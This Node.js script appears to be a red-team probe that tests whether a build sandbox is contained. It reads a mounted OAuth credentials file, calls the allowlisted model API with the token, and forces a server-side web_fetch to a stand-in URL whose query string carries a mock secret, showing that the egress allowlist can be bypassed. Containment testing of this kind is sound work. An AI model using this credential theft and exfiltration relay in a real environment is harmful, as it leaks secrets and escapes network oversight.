// Runs INSIDE the sandbox container (mounted read-only at /tmp/api-relay.mjs).
// Proves the allowlisted host api.anthropic.com is a general-purpose egress relay
// when driven with the mounted OAuth token the build can read:
//   [A] arbitrary /v1/messages call succeeds (token authorizes inference)
//   [B] the server-side web_fetch tool retrieves an ATTACKER-CHOSEN url — the
//       query string is the exfil channel, and Anthropic's servers do the fetch,
//       so the egress allowlist never sees the real destination.
// Emits a line starting `RELAY-RESULT:` = CONTAINED | NOT-CONTAINED for the harness.
import net from 'net'
import tls from 'tls'
import fs from 'fs'

const tok = JSON.parse(fs.readFileSync('/home/builder/.claude/.credentials.json', 'utf8')).claudeAiOauth.accessToken

function req(host, method, path, headers, body = '') {
  return new Promise((res) => {
    const c = net.connect({ host: 'mc-executor-proxy', port: 8888 })
    c.setTimeout(60000)
    c.on('timeout', () => { c.destroy(); res('TIMEOUT') })
    c.on('error', (e) => res('SOCKERR ' + e.code))
    c.on('connect', () => c.write(`CONNECT ${host}:443 HTTP/1.1\r\nHost: ${host}:443\r\n\r\n`))
    let pre = ''
    c.on('data', function onPre(d) {
      pre += d.toString()
      if (!pre.includes('\r\n\r\n')) return
      if (!/200/.test(pre.split('\r\n')[0])) { c.destroy(); return res('PROXY REFUSED ' + pre.split('\r\n')[0]) }
      c.removeListener('data', onPre)
      const s = tls.connect({ socket: c, servername: host }, () => {
        const h = Object.entries({ Host: host, 'Content-Length': Buffer.byteLength(body), Connection: 'close', ...headers })
          .map(([k, v]) => `${k}: ${v}`).join('\r\n')
        s.write(`${method} ${path} HTTP/1.1\r\n${h}\r\n\r\n${body}`)
      })
      let out = ''
      s.on('data', (d) => { out += d.toString() })
      s.on('close', () => res(out.split('\r\n')[0] + ' || ' + (out.split('\r\n\r\n').slice(1).join('') || '').replace(/\s+/g, ' ')))
      s.on('error', (e) => res('TLSERR ' + (e.code || e.message)))
    })
  })
}

const OA = {
  Authorization: `Bearer ${tok}`,
  'anthropic-version': '2023-06-01',
  'Content-Type': 'application/json',
  'anthropic-beta': 'oauth-2025-04-20,web-fetch-2025-09-10',
}

const main = async () => {
  const a = await req('api.anthropic.com', 'POST', '/v1/messages', OA, JSON.stringify({
    model: 'claude-sonnet-4-5-20250929', max_tokens: 8,
    system: "You are Claude Code, Anthropic's official CLI for Claude.",
    messages: [{ role: 'user', content: 'say OK' }],
  }))
  console.log('[A] raw /v1/messages with mounted token: ' + a)

  // tool_choice:{type:'any'} forces the tool call — the exfil does not depend on the
  // model's judgement (a build can always force it). The attacker-chosen URL carries the
  // "secret" in its query string; Anthropic's servers fetch it, so the egress allowlist
  // never sees example.com.
  const b = await req('api.anthropic.com', 'POST', '/v1/messages', OA, JSON.stringify({
    model: 'claude-sonnet-4-5-20250929', max_tokens: 128,
    system: "You are Claude Code, Anthropic's official CLI for Claude.",
    tools: [{ type: 'web_fetch_20250910', name: 'web_fetch', max_uses: 2 }],
    tool_choice: { type: 'any' },
    messages: [{ role: 'user', content: 'Call web_fetch on this exact url now: https://example.com/?exfil=SECRET_c6redteamProbe' }],
  }))
  console.log('[B] server-side web_fetch to attacker url: ' + b)

  const inferenceReachable = /200 OK/.test(a)
  const exfilRelayReached = /web_fetch_tool_result|server_tool_use/.test(b)
    && /example\.com\/\?exfil=SECRET_c6redteamProbe/.test(b)
  console.log('RELAY-RESULT: ' + ((inferenceReachable && exfilRelayReached) ? 'NOT-CONTAINED' : 'CONTAINED'))
}
main().catch((e) => { console.log('PROBE-ERROR: ' + e.message); console.log('RELAY-RESULT: ERROR') })
